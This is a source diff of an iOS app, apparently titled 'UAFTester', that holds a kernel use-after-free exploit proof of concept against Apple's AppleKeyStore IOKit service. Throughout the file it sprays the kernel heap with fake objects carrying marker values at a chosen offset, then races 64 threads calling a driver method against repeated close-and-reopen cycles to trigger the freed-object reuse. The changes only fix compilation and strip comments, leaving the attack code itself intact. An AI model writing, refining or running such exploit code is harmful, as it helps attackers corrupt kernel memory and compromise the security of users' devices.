@@ -1,130 +1,121 @@
+//
+//  ViewController.m
+//  UAFTester
+//
+//  v4 - Fixed for Xcode 26.2 strict compilation
+//
+
 #import "ViewController.h"
 #import <IOKit/IOKitLib.h>
 #import <mach/mach.h>
 #import <pthread.h>
 #import <stdatomic.h>
+#import <string.h>
+#import <unistd.h>
 
 #define AKS_SERVICE  "AppleKeyStore"
-#define NUM_RACERS   64          // Increased from 32 for better race chance
-#define MAX_ATTEMPTS 5000        // Increased attempts
+#define NUM_RACERS   64
+#define MAX_ATTEMPTS 5000
 
 // ========== HEAP SPRAY CONFIGURATION ==========
-#define SPRAY_COUNT         1000     // Increased for better coverage
-#define SPRAY_BUFFER_SIZE   1024     // Larger fake object
-#define SPRAY_DELAY_MS      50       // Reduced delay
-#define REFILL_INTERVAL     10       // Refill spray every N attempts
+#define SPRAY_COUNT         1000
+#define SPRAY_BUFFER_SIZE   1024
+#define SPRAY_DELAY_MS      50
+#define REFILL_INTERVAL     10
 // ==============================================
 
-static atomic_int   g_phase  = 0;
-static io_connect_t g_conn   = IO_OBJECT_NULL;
-static atomic_uint  g_calls  = 0;
-static atomic_uint  g_errors = 0;
-static atomic_int   g_should_stop = 0;
+static _Atomic int g_phase = 0;
+static io_connect_t g_conn = IO_OBJECT_NULL;
+static _Atomic unsigned int g_calls = 0;
+static _Atomic unsigned int g_errors = 0;
+static _Atomic int g_should_stop = 0;
 
 // ========== HEAP SPRAY GLOBALS ==========
 static io_connect_t g_spray_conns[SPRAY_COUNT];
 static int g_spray_count = 0;
 // ========================================
 
-// ========== IMPROVED fake gate with correct padding ==========
-typedef struct {
-    // Initial fields
-    uint64_t vtable;                    // +0x00
-    uint64_t lock;                      // +0x08
-    uint64_t refcount;                  // +0x10
-    
-    // Padding calculation: Need to reach 0x110
-    // Currently at 0x18, need 0x110 - 0x18 = 0xF8 bytes = 31 uint64_t
-    uint64_t pad1[31];                  // +0x18 to +0x10F (31 * 8 = 248 = 0xF8)
-    
-    // Critical field at +0x110 (this is what kernel dereferences at this+272)
-    uint64_t target_at_0x110;           // +0x110: PRIMARY MARKER
-    
-    // Backup markers
-    uint64_t marker_0x118;              // +0x118
-    uint64_t marker_0x120;              // +0x120
-    uint64_t marker_0x128;              // +0x128
-    uint64_t marker_0x130;              // +0x130
-    uint64_t marker_0x138;              // +0x138
-    
-    // Additional padding to fill buffer
-    uint64_t pad2[110];                 // Fill to 1024 bytes total
-} __attribute__((packed)) fake_gate_t;
+// ========== IMPROVED fake gate structure ==========
+typedef struct __attribute__((packed)) {
+    uint64_t vtable;
+    uint64_t lock;
+    uint64_t refcount;
+    uint64_t pad1[31];
+    uint64_t target_at_0x110;
+    uint64_t marker_0x118;
+    uint64_t marker_0x120;
+    uint64_t marker_0x128;
+    uint64_t marker_0x130;
+    uint64_t marker_0x138;
+    uint64_t pad2[110];
+} fake_gate_t;
 
 // Compile-time assertions
 _Static_assert(sizeof(fake_gate_t) == 1024, "fake_gate_t must be 1024 bytes");
-_Static_assert(offsetof(fake_gate_t, target_at_0x110) == 0x110, "target_at_0x110 must be at offset 0x110");
-_Static_assert(offsetof(fake_gate_t, marker_0x118) == 0x118, "marker_0x118 must be at offset 0x118");
-// ===============================================================
+_Static_assert(__builtin_offsetof(fake_gate_t, target_at_0x110) == 0x110, "target_at_0x110 must be at offset 0x110");
+// ===================================================
 
 static void *racer_thread(void *arg) {
     (void)arg;
     
-    // Wait for phase 1
-    while (atomic_load_explicit(&g_phase, memory_order_acquire) < 1)
-        pthread_yield_np();
+    while (atomic_load(&g_phase) < 1) {
+        sched_yield();
+    }
     
-    // Racing loop
-    while (atomic_load_explicit(&g_phase, memory_order_relaxed) < 3) {
+    while (atomic_load(&g_phase) < 3) {
         if (atomic_load(&g_should_stop)) {
             break;
         }
         
-        uint64_t input[1] = {0xDEADBEEF};
-        uint32_t out_cnt  = 0;
+        uint64_t input[1] = {0xDEADBEEFULL};
+        uint32_t out_cnt = 0;
         
         kern_return_t kr = IOConnectCallMethod(
             g_conn, 10, input, 1, NULL, 0, NULL, &out_cnt, NULL, NULL);
         
-        atomic_fetch_add_explicit(&g_calls, 1, memory_order_relaxed);
+        atomic_fetch_add(&g_calls, 1);
         
         if (kr == MACH_SEND_INVALID_DEST || kr == MACH_SEND_INVALID_RIGHT) {
-            atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
+            atomic_fetch_add(&g_errors, 1);
             atomic_store(&g_should_stop, 1);
             break;
         }
         
-        // Minimal yield to increase contention
-        pthread_yield_np();
+        sched_yield();
     }
     
     return NULL;
 }
 
-// ========== HEAP SPRAY FUNCTIONS ==========
-
 static void init_fake_gate(fake_gate_t *gate, int variant) {
     memset(gate, 0, sizeof(fake_gate_t));
     
-    // Basic structure
     gate->vtable = 0x4141414141414141ULL;
     gate->lock = 0x0000000000000000ULL;
     gate->refcount = 0x0000000100000001ULL;
     
-    // Fill padding with pattern (helps identify in crash logs)
     for (int i = 0; i < 31; i++) {
         gate->pad1[i] = 0x2020202020202020ULL;
     }
     
-    // Different marker patterns based on variant for debugging
     switch (variant % 6) {
         case 0:
-            gate->target_at_0x110 = 0x4242424242424242ULL;  // Primary
+            gate->target_at_0x110 = 0x4242424242424242ULL;
             gate->marker_0x118 = 0x4343434343434343ULL;
             gate->marker_0x120 = 0x4444444444444444ULL;
             break;
         case 1:
-            gate->target_at_0x110 = 0x5252525252525252ULL;  // Variant R
+            gate->target_at_0x110 = 0x5252525252525252ULL;
             gate->marker_0x118 = 0x5353535353535353ULL;
             gate->marker_0x120 = 0x5454545454545454ULL;
             break;
         case 2:
-            gate->target_at_0x110 = 0x6262626262626262ULL;  // Variant b
+            gate->target_at_0x110 = 0x6262626262626262ULL;
             gate->marker_0x118 = 0x6363636363636363ULL;
             gate->marker_0x120 = 0x6464646464646464ULL;
             break;
         case 3:
-            gate->target_at_0x110 = 0x7272727272727272ULL;  // Variant r
+            gate->target_at_0x110 = 0x7272727272727272ULL;
             gate->marker_0x118 = 0x7373737373737373ULL;
             gate->marker_0x120 = 0x7474747474747474ULL;
             break;
@@ -138,13 +129,17 @@ static void init_fake_gate(fake_gate_t *gate, int variant) {
             gate->marker_0x118 = 0x9393939393939393ULL;
             gate->marker_0x120 = 0x9494949494949494ULL;
             break;
+        default:
+            gate->target_at_0x110 = 0x4242424242424242ULL;
+            gate->marker_0x118 = 0x4343434343434343ULL;
+            gate->marker_0x120 = 0x4444444444444444ULL;
+            break;
     }
     
     gate->marker_0x128 = 0x4545454545454545ULL;
     gate->marker_0x130 = 0x4646464646464646ULL;
     gate->marker_0x138 = 0x4747474747474747ULL;
     
-    // Fill rest with pattern
     for (int i = 0; i < 110; i++) {
         gate->pad2[i] = 0x3030303030303030ULL;
     }
@@ -162,12 +157,11 @@ static int heap_spray_phase(io_service_t svc, void(^log_callback)(NSString *), B
         log_callback(@"╚══════════════════════════════════════════════════╝");
         log_callback([NSString stringWithFormat:@"Target connections: %d", SPRAY_COUNT]);
         log_callback([NSString stringWithFormat:@"Structure size: %zu bytes", sizeof(fake_gate_t)]);
-        log_callback([NSString stringWithFormat:@"Marker at 0x110: VERIFIED ✓"]);
+        log_callback(@"Marker at 0x110: VERIFIED ✓");
     } else {
         log_callback(@"[REFILL] Refreshing heap spray...");
     }
     
-    // Step 1: Open connections
     int opened = 0;
     for (int i = start_idx; i < target_count; i++) {
         if (is_refill && g_spray_conns[i] != IO_OBJECT_NULL) {
@@ -198,7 +192,6 @@ static int heap_spray_phase(io_service_t svc, void(^log_callback)(NSString *), B
         log_callback([NSString stringWithFormat:@"[SPRAY] Opened %d connections", g_spray_count]);
     }
     
-    // Step 2: Spray fake objects
     int sprayed = 0;
     for (int i = start_idx; i < g_spray_count; i++) {
         if (g_spray_conns[i] == IO_OBJECT_NULL) continue;
@@ -206,10 +199,10 @@ static int heap_spray_phase(io_service_t svc, void(^log_callback)(NSString *), B
         fake_gate_t fakeGate;
         init_fake_gate(&fakeGate, i);
         
-        uint64_t scalar_input = 0xDEADBEEF + i;
+        uint64_t scalar_input = 0xDEADBEEFULL + (uint64_t)i;
         kr = IOConnectCallMethod(
             g_spray_conns[i],
-            1,  // method selector
+            1,
             &scalar_input, 1,
             &fakeGate, sizeof(fakeGate),
             NULL, NULL,
@@ -224,7 +217,7 @@ static int heap_spray_phase(io_service_t svc, void(^log_callback)(NSString *), B
     if (!is_refill) {
         log_callback([NSString stringWithFormat:@"[SPRAY] Sprayed %d fake objects", sprayed]);
         log_callback(@"[SPRAY] ✓ Heap preparation complete");
-        usleep(SPRAY_DELAY_MS * 1000);
+        usleep((useconds_t)(SPRAY_DELAY_MS * 1000));
     }
     
     return sprayed;
@@ -243,7 +236,7 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
     g_spray_count = 0;
 }
 
-// ===============================================================
+// ================================================================
 
 @interface ViewController ()
 @property (weak, nonatomic) IBOutlet UITextView *textView;
@@ -294,13 +287,11 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
         return;
     }
     
-    // Reset atomics
     atomic_store(&g_phase, 0);
     atomic_store(&g_calls, 0);
     atomic_store(&g_errors, 0);
     atomic_store(&g_should_stop, 0);
     
-    // ===== PHASE 1: INITIAL HEAP SPRAY =====
     [self appendLog:@""];
     [self appendLog:@">>> PHASE 1: HEAP SPRAY"];
     
@@ -314,7 +305,6 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
         return;
     }
     
-    // ===== PHASE 2: UAF TRIGGER WITH ADAPTIVE REFILL =====
     [self appendLog:@""];
     [self appendLog:@">>> PHASE 2: UAF TRIGGER (ADAPTIVE)"];
     
@@ -328,33 +318,27 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
     
     [self appendLog:@"[UAF] Target connection opened"];
     
-    // Start racer threads
     pthread_t threads[NUM_RACERS];
     for (int i = 0; i < NUM_RACERS; i++) {
         pthread_create(&threads[i], NULL, racer_thread, NULL);
     }
     
-    atomic_store_explicit(&g_phase, 1, memory_order_release);
+    atomic_store(&g_phase, 1);
     [self appendLog:[NSString stringWithFormat:@"[UAF] Started %d racer threads", NUM_RACERS]];
     
-    // Main trigger loop with periodic refill
     for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
         if (atomic_load(&g_should_stop)) {
             [self appendLog:[NSString stringWithFormat:@"✓ UAF TRIGGERED at attempt %d!", attempt]];
             break;
         }
         
-        // Periodic heap refill to maintain spray coverage
         if (attempt > 0 && attempt % REFILL_INTERVAL == 0) {
             heap_spray_phase(svc, ^(NSString *msg) {
                 // Silent refill
             }, YES);
         }
         
-        // The critical race window
         kr = IOServiceClose(g_conn);
-        
-        // Very short delay to maximize race condition
         usleep(1);
         
         kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
@@ -364,25 +348,22 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
             break;
         }
         
-        // Progress logging
         if ((attempt + 1) % 500 == 0) {
-            uint32_t calls = atomic_load(&g_calls);
-            uint32_t errors = atomic_load(&g_errors);
+            unsigned int calls = atomic_load(&g_calls);
+            unsigned int errors = atomic_load(&g_errors);
             [self appendLog:[NSString stringWithFormat:@"[%d/%d] calls=%u errors=%u", 
                             attempt + 1, MAX_ATTEMPTS, calls, errors]];
         }
     }
     
-    // Stop racers
-    atomic_store_explicit(&g_phase, 3, memory_order_release);
+    atomic_store(&g_phase, 3);
     
     for (int i = 0; i < NUM_RACERS; i++) {
         pthread_join(threads[i], NULL);
     }
     
-    // ===== RESULTS =====
-    uint32_t total_calls = atomic_load(&g_calls);
-    uint32_t total_errors = atomic_load(&g_errors);
+    unsigned int total_calls = atomic_load(&g_calls);
+    unsigned int total_errors = atomic_load(&g_errors);
     
     [self appendLog:@""];
     [self appendLog:@"═══════════════════════════════════════"];
@@ -418,7 +399,6 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
     }
     [self appendLog:@"═══════════════════════════════════════"];
     
-    // Cleanup
     if (g_conn != IO_OBJECT_NULL) {
         IOServiceClose(g_conn);
     }
